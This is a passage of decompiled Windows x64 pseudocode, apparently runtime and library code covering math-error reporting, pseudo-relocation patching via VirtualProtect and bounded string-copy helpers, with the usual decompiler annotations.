      v6 = "The result is too small to be represented (UNDERFLOW)";
      goto LABEL_15;
    }
    if ( v5 < 6 )
    {
      v6 = "Total loss of significance (TLOSS)";
      goto LABEL_15;
    }
    if ( v5 == 6 )
    {
      v6 = "Partial loss of significance (PLOSS)";
      goto LABEL_15;
    }
    goto LABEL_14;
  }
  if ( v5 < 2 )
  {
    if ( v5 == 1 )
    {
      v6 = "Argument domain error (DOMAIN)";
      goto LABEL_15;
    }
LABEL_14:
    v6 = (char *)&Stream;
    goto LABEL_15;
  }
  v6 = "Overflow range error (OVERFLOW)";
  if ( v5 == 2 )
    v6 = "Argument singularity (SIGN)";
LABEL_15:
  v7 = sub_140006230((__int64)v6, a4, a3, 2);
  fprintf((FILE *const)v6, (const char *const)a4, (char *)&Stream._cnt + 6, v7, v6, *(_QWORD *)(a4 + 8));
  return 0LL;
}

//----- (00000001400020C0) ----------------------------------------------------
void sub_1400020C0()
{
  __asm { fninit }
}

//----- (00000001400020D0) ----------------------------------------------------
void __fastcall sub_1400020D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 v4; // r8
  __int64 v5; // r9
  void *v6; // rsp
  char v7; // [rsp+0h] [rbp-10h] BYREF

  if ( !byte_1400120D8 )
  {
    byte_1400120D8 = 1;
    sub_1400063E0();
    v6 = alloca(sub_140006614(a1, a2, v2, v3, v4, v5, v7));
    qword_1400120E0 = (__int64)&v7;
    dword_1400120E8 = 0;
  }
}
// 140002118: variable 'v2' is possibly undefined
// 140002118: variable 'v3' is possibly undefined
// 140002118: variable 'v4' is possibly undefined
// 140002118: variable 'v5' is possibly undefined
// 1400063E0: using guessed type __int64 sub_1400063E0(void);
// 14000D010: using guessed type void *off_14000D010;
// 1400120D8: using guessed type char byte_1400120D8;
// 1400120E0: using guessed type __int64 qword_1400120E0;
// 1400120E8: using guessed type int dword_1400120E8;

//----- (00000001400023B0) ----------------------------------------------------
void *__fastcall sub_1400023B0(unsigned __int64 a1, __int64 a2, __int64 a3, struct _MEMORY_BASIC_INFORMATION *a4)
{
  size_t v4; // r15
  __int64 v6; // r12
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rbx
  DWORD *v10; // rcx
  __int64 v11; // r9
  DWORD v12; // edx
  DWORD LastError; // eax
  SIZE_T dwLength[3]; // [rsp+28h] [rbp-60h] BYREF
  DWORD flNewProtect[2]; // [rsp+40h] [rbp-48h]
  int v17; // [rsp+4Ch] [rbp-3Ch]

  v4 = a3;
  v6 = (unsigned int)dword_1400120E8;
  if ( dword_1400120E8 <= 0 )
  {
    v6 = 0LL;
LABEL_8:
    v7 = sub_140006370(a1, (__int64)a4, a3, (__int64)a4);
    if ( !v7 )
      sub_140002550((FILE *)a1, (__int64)a4, (__int64)a4, "Address %p has no image-section");
    a1 = v7;
    v8 = qword_1400120E0;
    v9 = 40 * v6;
    *(_QWORD *)(qword_1400120E0 + v9 + 32) = a1;
    *(_DWORD *)(v8 + v9) = 0;
    *(_QWORD *)(qword_1400120E0 + v9 + 24) = (char *)sub_140006490() + *(unsigned int *)(a1 + 12);
    if ( !VirtualQuery((LPCVOID)a1, a4, (SIZE_T)dwLength) )
      sub_140002550(
        (FILE *)a1,
        (__int64)a4,
        *(unsigned int *)(a1 + 8),
        "  VirtualQuery failed for %d bytes at address %p");
    if ( v17 <= 7 )
    {
      if ( v17 != 4 )
        goto LABEL_16;
    }
    else if ( v17 != 8 && v17 != 64 && v17 != 128 )
    {
LABEL_16:
      v10 = (DWORD *)dwLength[0];
      v11 = qword_1400120E0 + 40 * v6;
      *(_QWORD *)(v11 + 8) = dwLength[0];
      v12 = flNewProtect[0];
      *(_QWORD *)(v11 + 16) = *(_QWORD *)flNewProtect;
      if ( !VirtualProtect((LPVOID)a1, (SIZE_T)a4, v12, v10) )
      {
        LastError = GetLastError();
        sub_140002550((FILE *)a1, (__int64)a4, LastError, "  VirtualProtect failed with code 0x%x");
      }
    }
    ++dword_1400120E8;
    return memcpy((void *)a1, a4, v4);
  }
  a3 = 0LL;
  while ( 1 )
  {
    a1 = *(_QWORD *)(qword_1400120E0 + a3 + 24);
    if ( a1 <= (unsigned __int64)a4 )
    {
      a1 += *(unsigned int *)(*(_QWORD *)(qword_1400120E0 + a3 + 32) + 8LL);
      if ( a1 > (unsigned __int64)a4 )
        return memcpy((void *)a1, a4, v4);
    }
    a3 += 40LL;
    if ( 40LL * (unsigned int)dword_1400120E8 == a3 )
      goto LABEL_8;
  }
}
// 1400120E0: using guessed type __int64 qword_1400120E0;
// 1400120E8: using guessed type int dword_1400120E8;
// 1400023B0: using guessed type SIZE_T dwLength[3];

//----- (0000000140002550) ----------------------------------------------------
void __fastcall __noreturn sub_140002550(FILE *a1, __int64 a2, __int64 a3, char *a4)
{
  __int64 v5; // rdx

  sub_140006230((__int64)a1, (__int64)a4, a3, 2);
  fwrite(a1, (size_t)a4, 0x1BuLL, (FILE *)&stru_14000D346);
  sub_140006230((__int64)a1, (__int64)a4, v5, 2);
  vfprintf(a1, a4, a4);
  abort();
}
// 14000259A: variable 'v5' is possibly undefined

//----- (00000001400025C0) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_1400025C0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        int a4,
        double a5,
        double a6,
        double a7,
        double a8,
        __int64 a9,
        __int64 a10,
        int a11,
        int a12,
        int a13,
        int a14,
        __int64 a15))(_QWORD, _QWORD, _QWORD, _QWORD)
{
  __int64 (__fastcall *result)(_QWORD, _QWORD, _QWORD, _QWORD); // rax
  int v16; // [rsp+20h] [rbp-28h] BYREF
  __int64 v17; // [rsp+28h] [rbp-20h]
  double v18; // [rsp+30h] [rbp-18h]
  double v19; // [rsp+38h] [rbp-10h]
  __int64 v20; // [rsp+40h] [rbp-8h]

  result = qword_1400120F0;
  if ( qword_1400120F0 )
  {
    v16 = a4;
    v17 = a3;
    v18 = a7;
    v19 = a8;
    v20 = a15;
    return (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))qword_1400120F0(a1, a2, a3, &v16);
  }
  return result;
}
// 1400120F0: using guessed type __int64 (__fastcall *qword_1400120F0)(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (0000000140002600) ----------------------------------------------------
void __fastcall sub_140002600(
        _UserMathErrorFunctionPointer UserMathErrorFunction,
        __int64 a2,
        __int64 a3,
        __int64 (__fastcall *a4)(_QWORD, _QWORD, _QWORD, _QWORD))
{
  qword_1400120F0 = a4;
  _setusermatherr(UserMathErrorFunction);
}
// 1400120F0: using guessed type __int64 (__fastcall *qword_1400120F0)(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (0000000140002970) ----------------------------------------------------
__int64 __fastcall sub_140002970(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        _BYTE *a5,
        char **a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  __int64 v13; // [rsp+0h] [rbp-38h]
  __int64 v14; // [rsp+8h] [rbp-30h]
  __int64 v15; // [rsp+10h] [rbp-28h]
  __int64 v16; // [rsp+18h] [rbp-20h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_1400029C0(a1, a2, a3, a4, a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 1400029A6: variable 'v13' is possibly undefined
// 1400029A6: variable 'v14' is possibly undefined
// 1400029A6: variable 'v15' is possibly undefined
// 1400029A6: variable 'v16' is possibly undefined

//----- (00000001400029C0) ----------------------------------------------------
__int64 __fastcall sub_1400029C0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        __int64 a5,
        _BYTE *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        char **a11,
        _QWORD *a12,
        unsigned int Size)
{
  char *v13; // rdi
  char *v14; // rsi
  _BYTE *v15; // rax
  int v16; // r15d
  char *v17; // rbx
  char *v18; // r12
  __int64 v19; // rcx
  __int64 v20; // rbp
  char v21; // cl
  char *v22; // rax
  __int64 v23; // rcx

  v13 = (char *)a3;
  v14 = a4;
  if ( Size > 0x1FFF )
  {
    v16 = -2147024809;
    goto LABEL_5;
  }
  if ( (Size & 0x100) != 0 )
  {
    v15 = &unk_14000D378;
    if ( a6 )
      v15 = a6;
    if ( !a4 && a3 | a5 )
    {
      v14 = 0LL;
      v16 = -2147024809;
      v13 = 0LL;
      goto LABEL_36;
    }
  }
  else
  {
    v15 = a6;
  }
  if ( !a3 )
  {
    if ( !*v15 )
    {
      v13 = 0LL;
      v16 = 0;
      goto LABEL_37;
    }
    v16 = -2147024774;
    if ( !a4 )
      v16 = -2147024809;
LABEL_5:
    v17 = 0LL;
    v18 = a4;
    if ( a4 )
      goto LABEL_24;
    goto LABEL_33;
  }
  v19 = 0LL;
  while ( 1 )
  {
    v20 = v19;
    v21 = v15[v19];
    if ( !v21 )
      break;
    v14[v20] = v21;
    v19 = v20 + 1;
    if ( a3 == v20 + 1 )
    {
      v16 = -2147024774;
      goto LABEL_23;
    }
  }
  v16 = 0;
  if ( (Size & 0x200) != 0 )
    memset((void *)a3, (int)v14, Size);
LABEL_23:
  v18 = &v14[v20];
  v14[v20] = 0;
  v17 = &v13[-v20];
  if ( v14 )
  {
LABEL_24:
    if ( v16 < 0 )
    {
      if ( (Size & 0x400) == 0 )
      {
        v22 = v18;
        v23 = (__int64)v17;
LABEL_30:
        if ( v13 && (Size & 0x1800) != 0 )
        {
          *v14 = 0;
        }
        else
        {
          v14 = v22;
          v13 = (char *)v23;
        }
LABEL_36:
        if ( v16 != -2147024774 )
          return (unsigned int)v16;
        goto LABEL_37;
      }
      memset(v13, (int)v14, Size);
      v22 = v14;
      v23 = (__int64)v13;
      if ( !(_BYTE)Size )
        goto LABEL_30;
      if ( v13 )
      {
        v22 = &v13[(_QWORD)v14 - 1];
        *v22 = 0;
        v23 = 1LL;
        goto LABEL_30;
      }
    }
  }
LABEL_33:
  v14 = v18;
  v13 = v17;
  if ( v16 < 0 )
    goto LABEL_36;
LABEL_37:
  if ( a11 )
    *a11 = v14;
  if ( a12 )
    *a12 = v13;
  return (unsigned int)v16;
}
// 140002B21: conditional instruction was optimized away because r15d.4 is in (==80070057|==8007007A)
// 140002B3B: conditional instruction was optimized away because r15d.4 is in (==80070057|==8007007A)

//----- (0000000140002B90) ----------------------------------------------------
__int64 __fastcall sub_140002B90(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        __int64 *a11,
        unsigned int a12)
{
  __int64 v13; // [rsp+0h] [rbp-38h]
  __int64 v14; // [rsp+8h] [rbp-30h]
  __int64 v15; // [rsp+10h] [rbp-28h]
  __int64 v16; // [rsp+18h] [rbp-20h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140002BE0(a1, a2, a3, a4, 2 * a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 140002BC7: variable 'v13' is possibly undefined
// 140002BC7: variable 'v14' is possibly undefined
// 140002BC7: variable 'v15' is possibly undefined
// 140002BC7: variable 'v16' is possibly undefined

//----- (0000000140002BE0) ----------------------------------------------------
__int64 __fastcall sub_140002BE0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        __int64 a5,
        _WORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        _QWORD *a11,
        __int64 *a12,
        unsigned int Size)
{
  __int64 v13; // r15
  _WORD *v14; // rsi
  _WORD *v15; // rax
  int v16; // r12d
  void *v17; // rdi
  _WORD *v18; // r13
  __int64 v19; // rcx
  __int64 v20; // rbx
  __int16 v21; // cx
  _WORD *v22; // rax
  __int64 v23; // rcx

  v13 = a3;
  v14 = a4;
  if ( Size > 0x1FFF )
  {
    v16 = -2147024809;
    goto LABEL_5;
  }
  if ( (Size & 0x100) != 0 )
  {
    v15 = &unk_14000D37A;
    if ( a6 )
      v15 = a6;
    if ( !a4 && a3 | a5 )
    {
      v14 = 0LL;
      v16 = -2147024809;
      v13 = 0LL;
      goto LABEL_36;
    }
  }
  else
  {
    v15 = a6;
  }
  if ( !a3 )
  {
    if ( !*v15 )
    {
      v13 = 0LL;
      v16 = 0;
      goto LABEL_37;
    }
    v16 = -2147024774;
    if ( !a4 )
      v16 = -2147024809;
LABEL_5:
    v17 = 0LL;
    v18 = a4;
    if ( a4 )
      goto LABEL_24;
    goto LABEL_33;
  }
  v19 = 0LL;
  while ( 1 )
  {
    v17 = (void *)a3;
    v20 = v19;
    v21 = *(_WORD *)((char *)v15 + v19);
    if ( !v21 )
      break;
    *(_WORD *)((char *)v14 + v20) = v21;
    v19 = v20 + 2;
    --a3;
    if ( v17 == (void *)1 )
    {
      v16 = -2147024774;
      goto LABEL_23;
    }
  }
  v16 = 0;
  if ( (Size & 0x200) != 0 )
    memset((void *)a3, (int)v14, Size);
LABEL_23:
  v18 = (_WORD *)((char *)v14 + v20);
  *(_WORD *)((char *)v14 + v20) = 0;
  if ( v14 )
  {
LABEL_24:
    if ( v16 < 0 )
    {
      if ( (Size & 0x400) == 0 )
      {
        v22 = v18;
        v23 = (__int64)v17;
LABEL_30:
        if ( v13 && (Size & 0x1800) != 0 )
        {
          *v14 = 0;
        }
        else
        {
          v14 = v22;
          v13 = v23;
        }
LABEL_36:
        if ( v16 != -2147024774 )
          return (unsigned int)v16;
        goto LABEL_37;
      }
      memset(v17, (int)v14, Size);
      v22 = v14;
      v23 = v13;
      if ( !(_BYTE)Size )
        goto LABEL_30;
      if ( v13 )
      {
        v22 = &v14[v13 - 1];
        *v22 = 0;
        v23 = 1LL;
        goto LABEL_30;
      }
    }
  }
LABEL_33:
  v14 = v18;
  v13 = (__int64)v17;
  if ( v16 < 0 )
    goto LABEL_36;
LABEL_37:
  if ( a11 )
    *a11 = v14;
  if ( a12 )
    *a12 = v13;
  return (unsigned int)v16;
}
// 140002D53: conditional instruction was optimized away because r12d.4 is in (==80070057|==8007007A)
// 140002D6D: conditional instruction was optimized away because r12d.4 is in (==80070057|==8007007A)

//----- (0000000140002DC0) ----------------------------------------------------
__int64 __fastcall sub_140002DC0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        _BYTE *a5,
        char **a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  __int64 result; // rax
  __int64 v13; // [rsp+0h] [rbp-48h]
  __int64 v14; // [rsp+8h] [rbp-40h]
  __int64 v15; // [rsp+10h] [rbp-38h]
  __int64 v16; // [rsp+18h] [rbp-30h]
  __int64 v17; // [rsp+38h] [rbp-10h] BYREF

  v17 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    result = sub_1400029C0(a1, (__int64)a11, a3, a4, a3, a5, v13, v14, v15, v16, a6, &v17, a12);
    if ( a11 )
    {
      if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
        *a11 = v17;
    }
  }
  return result;
}
// 140002E01: variable 'v13' is possibly undefined
// 140002E01: variable 'v14' is possibly undefined
// 140002E01: variable 'v15' is possibly undefined
// 140002E01: variable 'v16' is possibly undefined

//----- (0000000140002E30) ----------------------------------------------------
__int64 __fastcall sub_140002E30(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]
  __int64 v18[3]; // [rsp+40h] [rbp-18h] BYREF

  v18[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
  {
    result = sub_140002BE0((__int64)a11, a3, a3 >> 1, a4, a3, a5, v14, v15, v16, v17, a6, v18, a12);
    if ( a11 )
    {
      if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
        *a11 = (a3 & 1) + 2 * v18[0];
    }
  }
  return result;
}
// 140002E7E: variable 'v14' is possibly undefined
// 140002E7E: variable 'v15' is possibly undefined
// 140002E7E: variable 'v16' is possibly undefined
// 140002E7E: variable 'v17' is possibly undefined
// 140002E30: using guessed type __int64 var_18[3];

//----- (0000000140002EB0) ----------------------------------------------------
__int64 __fastcall sub_140002EB0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, unsigned __int64 a6)
{
  __int64 result; // rax
  unsigned __int64 v7; // r9
  __int64 v8; // rsi
  char v9; // al
  __int64 v10; // r10
  __int64 v11; // r11
  _BYTE *v12; // rdx

  result = 2147942487LL;
  if ( a3 && (a3 | a6) <= 0x7FFFFFFF )
  {
    if ( a6 )
    {
      v7 = a6 - 1;
      v8 = 0LL;
      while ( 1 )
      {
        v9 = *(_BYTE *)(a5 + v8);
        if ( !v9 )
          break;
        a4[v8] = v9;
        v10 = a3 - 1;
        v11 = v8 + 1;
        if ( v7 != v8 )
        {
          ++v8;
          if ( --a3 )
            continue;
        }
        a4 += v11;
        goto LABEL_11;
      }
      a4 += v8;
      v10 = a3;
    }
    else
    {
      v10 = 1LL;
    }
LABEL_11:
    v12 = a4 - 1;
    if ( v10 )
      v12 = a4;
    result = 2147942522LL;
    if ( v10 )
      result = 0LL;
    *v12 = 0;
  }
  return result;
}

//----- (0000000140002F40) ----------------------------------------------------
__int64 __fastcall sub_140002F40(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6)
{
  __int64 v6; // r9
  __int64 v7; // rsi
  char v8; // al
  __int64 v9; // r10
  __int64 v10; // r11
  __int64 result; // rax
  _BYTE *v13; // rdx

  if ( !a3 )
    return 2147942487LL;
  if ( a6 )
  {
    v6 = a6 - 1;
    v7 = 0LL;
    while ( 1 )
    {
      v8 = *(_BYTE *)(a5 + v7);
      if ( !v8 )
        break;
      a4[v7] = v8;
      v9 = a3 - 1;
      v10 = v7 + 1;
      if ( a3 != 1 )
      {
        --a3;
        if ( v6 != v7++ )
          continue;
      }
      a4 += v10;
      goto LABEL_11;
    }
    a4 += v7;
    v9 = a3;
  }
  else
  {
    v9 = 1LL;
  }
LABEL_11:
  v13 = a4 - 1;
  if ( v9 )
    v13 = a4;
  result = 2147942522LL;
  if ( v9 )
    result = 0LL;
  *v13 = 0;
  return result;
}

//----- (00000001400030D0) ----------------------------------------------------
__int64 __fastcall sub_1400030D0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, unsigned __int64 a6)
{
  __int64 result; // rax
  unsigned __int64 v7; // r9
  __int64 v8; // rsi
  char v9; // al
  __int64 v10; // r10
  __int64 v11; // r11
  _BYTE *v12; // rdx

  result = 2147942487LL;
  if ( a3 && (a3 | a6) <= 0x7FFFFFFF )
  {
    if ( a6 )
    {
      v7 = a6 - 1;
      v8 = 0LL;
      while ( 1 )
      {
        v9 = *(_BYTE *)(a5 + v8);
        if ( !v9 )
          break;
        a4[v8] = v9;
        v10 = a3 - 1;
        v11 = v8 + 1;
        if ( v7 != v8 )
        {
          ++v8;
          if ( --a3 )
            continue;
        }
        a4 += v11;
        goto LABEL_11;
      }
      a4 += v8;
      v10 = a3;
    }
    else
    {
      v10 = 1LL;
    }
LABEL_11:
    v12 = a4 - 1;
    if ( v10 )
      v12 = a4;
    result = 2147942522LL;
    if ( v10 )
      result = 0LL;
    *v12 = 0;
  }
  return result;
}

//----- (00000001400031F0) ----------------------------------------------------
__int64 __fastcall sub_1400031F0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _BYTE *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        __int64 *a12,
        unsigned int a13)
{
  __int64 v14; // [rsp+0h] [rbp-48h]
  __int64 v15; // [rsp+8h] [rbp-40h]
  __int64 v16; // [rsp+10h] [rbp-38h]
  __int64 v17; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140003240(a1, a2, a3, a4, a3, a5, v14, v15, v16, v17, a6, a11, a12, a13);
  else
    return 2147942487LL;
}
// 140003233: variable 'v14' is possibly undefined
// 140003233: variable 'v15' is possibly undefined
// 140003233: variable 'v16' is possibly undefined
// 140003233: variable 'v17' is possibly undefined

//----- (0000000140003240) ----------------------------------------------------
__int64 __fastcall sub_140003240(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        _BYTE *a4,
        __int64 a5,
        _BYTE *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned __int64 a11,
        _QWORD *a12,
        __int64 *a13,
        unsigned int Size)
{
  __int64 v14; // r15
  _BYTE *v15; // rdi
  __int64 v16; // r12
  int v17; // ebp
  _BYTE *v18; // rsi
  _BYTE *v19; // rcx
  __int64 v20; // rbp
  __int64 v21; // rdx
  char v22; // bl
  __int64 v23; // rsi
  _BYTE *v25; // rax
  __int64 v26; // rcx

  v14 = a3;
  v15 = a4;
  v16 = 0LL;
  v17 = -2147024809;
  v18 = a4;
  if ( a11 <= 0x7FFFFFFF && Size <= 0x1FFF )
  {
    if ( (Size & 0x100) != 0 )
    {
      v19 = &unk_14000D378;
      if ( a6 )
        v19 = a6;
      if ( !v15 && a3 | a5 )
      {
        v15 = 0LL;
        v17 = -2147024809;
        v14 = 0LL;
        goto LABEL_42;
      }
    }
    else
    {
      v19 = a6;
    }
    if ( a3 )
    {
      v18 = v15;
      v16 = a3;
      if ( a11 )
      {
        v20 = a3 - 1;
        v21 = 0LL;
        do
        {
          v22 = v19[v21];
          if ( !v22 )
          {
            v16 = v14 - v21;
            v18 = &v15[v21];
            goto LABEL_26;
          }
          v15[v21] = v22;
          v23 = v21 + 1;
          if ( a11 - 1 == v21 )
            break;
        }
        while ( v20 != v21++ );
        v16 = v14 - v23;
        if ( v14 == v23 )
        {
          v18 = &v15[v23 - 1];
          v16 = 1LL;
          v17 = -2147024774;
          goto LABEL_28;
        }
        v18 = &v15[v23];
      }
LABEL_26:
      v17 = 0;
      if ( (Size & 0x200) != 0 )
        memset(v15, (int)v18, Size);
LABEL_28:
      *v18 = 0;
    }
    else
    {
      if ( !a11 || !*v19 )
      {
        v14 = 0LL;
        v17 = 0;
        goto LABEL_43;
      }
      v17 = -2147024774;
      if ( !v15 )
        v17 = -2147024809;
      v16 = 0LL;
      v18 = v15;
    }
  }
  if ( v15 && v17 < 0 )
  {
    if ( (Size & 0x400) == 0 )
    {
      v25 = v18;
      v26 = v16;
LABEL_36:
      if ( v14 && (Size & 0x1800) != 0 )
      {
        *v15 = 0;
      }
      else
      {
        v15 = v25;
        v14 = v26;
      }
LABEL_42:
      if ( v17 != -2147024774 )
        return (unsigned int)v17;
      goto LABEL_43;
    }
    memset(v15, (int)v18, Size);
    v25 = v15;
    v26 = v14;
    if ( !(_BYTE)Size )
      goto LABEL_36;
    if ( v14 )
    {
      v25 = &v15[v14 - 1];
      *v25 = 0;
      v26 = 1LL;
      goto LABEL_36;
    }
  }
  v15 = v18;
  v14 = v16;
  if ( v17 < 0 )
    goto LABEL_42;
LABEL_43:
  if ( a12 )
    *a12 = v15;
  if ( a13 )
    *a13 = v14;
  return (unsigned int)v17;
}
// 1400033F3: conditional instruction was optimized away because ebp.4 is in (==80070057|==8007007A)
// 14000340B: conditional instruction was optimized away because ebp.4 is in (==80070057|==8007007A)

//----- (0000000140003450) ----------------------------------------------------
__int64 __fastcall sub_140003450(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        __int64 *a12,
        unsigned int a13)
{
  __int64 v14; // [rsp+0h] [rbp-48h]
  __int64 v15; // [rsp+8h] [rbp-40h]
  __int64 v16; // [rsp+10h] [rbp-38h]
  __int64 v17; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_1400034B0(a1, (__int64)a11, a3, a4, 2 * a3, a5, v14, v15, v16, v17, a6, a11, a12, a13);
  else
    return 2147942487LL;
}
// 140003495: variable 'v14' is possibly undefined
// 140003495: variable 'v15' is possibly undefined
// 140003495: variable 'v16' is possibly undefined
// 140003495: variable 'v17' is possibly undefined

//----- (00000001400034B0) ----------------------------------------------------
__int64 __fastcall sub_1400034B0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        _WORD *a4,
        __int64 a5,
        _WORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned __int64 a11,
        _QWORD *a12,
        __int64 *a13,
        unsigned int Size)
{
  __int64 v14; // r15
  _WORD *v15; // rdi
  __int64 v16; // r13
  int v17; // ebp
  _WORD *v18; // rsi
  _WORD *v19; // rcx
  __int64 v20; // rdx
  __int64 v21; // rbp
  __int16 v22; // bx
  __int64 v23; // rbx
  _WORD *v25; // rax
  __int64 v26; // rcx

  v14 = a3;
  v15 = a4;
  v16 = 0LL;
  v17 = -2147024809;
  v18 = a4;
  if ( a11 <= 0x7FFFFFFF && Size <= 0x1FFF )
  {
    if ( (Size & 0x100) != 0 )
    {
      v19 = &unk_14000D37A;
      if ( a6 )
        v19 = a6;
      if ( !v15 && a3 | a5 )
      {
        v15 = 0LL;
        v17 = -2147024809;
        v14 = 0LL;
        goto LABEL_41;
      }
    }
    else
    {
      v19 = a6;
    }
    if ( a3 )
    {
      v18 = v15;
      v16 = a3;
      if ( a11 )
      {
        v20 = a3 - 1;
        v21 = 0LL;
        v18 = v15;
        do
        {
          v22 = v19[v21];
          if ( !v22 )
          {
            v16 = v14 - v21;
            goto LABEL_25;
          }
          ++v18;
          v15[v21] = v22;
          v23 = v21 + 1;
          if ( a11 - 1 == v21 )
            break;
        }
        while ( v20 != v21++ );
        v16 = v14 - v23;
        if ( v14 != v23 )
          goto LABEL_25;
        --v18;
        v16 = 1LL;
        v17 = -2147024774;
      }
      else
      {
LABEL_25:
        v17 = 0;
        if ( (Size & 0x200) != 0 )
          memset(v15, (int)v18, Size);
      }
      *v18 = 0;
    }
    else
    {
      if ( !a11 || !*v19 )
      {
        v14 = 0LL;
        v17 = 0;
        goto LABEL_42;
      }
      v17 = -2147024774;
      if ( !v15 )
        v17 = -2147024809;
      v16 = 0LL;
      v18 = v15;
    }
  }
  if ( v15 && v17 < 0 )
  {
    if ( (Size & 0x400) == 0 )
    {
      v25 = v18;
      v26 = v16;
LABEL_35:
      if ( v14 && (Size & 0x1800) != 0 )
      {
        *v15 = 0;
      }
      else
      {
        v15 = v25;
        v14 = v26;
      }
LABEL_41:
      if ( v17 != -2147024774 )
        return (unsigned int)v17;
      goto LABEL_42;
    }
    memset(v15, (int)v18, Size);
    v25 = v15;
    v26 = v14;
    if ( !(_BYTE)Size )
      goto LABEL_35;
    if ( v14 )
    {
      v25 = &v15[v14 - 1];
      *v25 = 0;
      v26 = 1LL;
      goto LABEL_35;
    }
  }
  v15 = v18;
  v14 = v16;
  if ( v17 < 0 )
    goto LABEL_41;
LABEL_42:
  if ( a12 )
    *a12 = v15;
  if ( a13 )
    *a13 = v14;
  return (unsigned int)v17;
}
// 140003667: conditional instruction was optimized away because ebp.4 is in (==80070057|==8007007A)
// 14000367F: conditional instruction was optimized away because ebp.4 is in (==80070057|==8007007A)

//----- (00000001400036C0) ----------------------------------------------------
__int64 __fastcall sub_1400036C0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _BYTE *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        _QWORD *a12,
        unsigned int a13)
{
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]
  __int64 v18; // [rsp+48h] [rbp-10h] BYREF

  v18 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    result = sub_140003240(a1, (__int64)a12, a3, a4, a3, a5, v14, v15, v16, v17, a6, a11, &v18, a13);
  if ( a12 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a12 = v18;
  }
  return result;
}
// 140003714: variable 'v14' is possibly undefined
// 140003714: variable 'v15' is possibly undefined
// 140003714: variable 'v16' is possibly undefined
// 140003714: variable 'v17' is possibly undefined

//----- (0000000140003740) ----------------------------------------------------
__int64 __fastcall sub_140003740(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        _QWORD *a12,
        unsigned int a13)
{
  char v13; // si
  __int64 result; // rax
  __int64 v15; // [rsp+0h] [rbp-58h]
  __int64 v16; // [rsp+8h] [rbp-50h]
  __int64 v17; // [rsp+10h] [rbp-48h]
  __int64 v18; // [rsp+18h] [rbp-40h]
  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v13 = a3;
  v19[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
    result = sub_1400034B0((__int64)a12, a3, a3 >> 1, a4, a3, a5, v15, v16, v17, v18, a6 >> 1, a11, v19, a13);
  if ( a12 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a12 = (v13 & 1) + 2 * v19[0];
  }
  return result;
}
// 1400037A1: variable 'v15' is possibly undefined
// 1400037A1: variable 'v16' is possibly undefined
